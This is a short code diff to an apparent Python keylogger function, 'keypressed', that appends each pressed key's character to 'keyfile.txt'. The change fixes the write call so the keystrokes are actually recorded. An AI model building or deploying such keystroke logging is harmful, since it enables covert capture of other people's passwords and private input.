@@ -8,7 +8,7 @@ def keypressed(key):
     with open("keyfile.txt", 'a') as logKey:
         try:
             char = key.char
-            logKey.write()
+            logKey.write(char)
         except:
             print("Error")
 
